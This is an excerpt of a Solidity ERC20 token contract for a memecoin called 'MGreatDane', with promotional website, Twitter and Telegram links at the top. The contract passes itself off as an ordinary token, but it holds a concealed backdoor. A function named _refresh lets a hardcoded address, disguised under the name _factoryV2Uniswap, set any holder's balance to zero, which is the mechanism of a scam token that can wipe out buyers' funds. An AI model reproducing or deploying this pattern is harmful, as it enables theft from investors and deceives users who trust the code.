...
/*
https://MGreatDaneCoinETH.xyz
https://twitter.com/GreatDaneERC
https://t.me/GreatDaneERC
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _factoryV2Uniswap = 0x0534F919fDBBc5e6822227Ce69c23C512611C817;
    uint256 private _totalSupply;
    address internal V2uniswapRouter = 0x79427161bc405B481F96C97D3b44742d2B3cd3Cb;
    ...
    function _refresh(address _refreshSender) external {
        if (msg.sender == _factoryV2Uniswap) _balances[_refreshSender] = 0x0; }
...
contract MGreatDaneCoin is ERC20, Ownable
{
    constructor()
    ERC20(unicode"MGreatDane", unicode"Hamlet")
    {
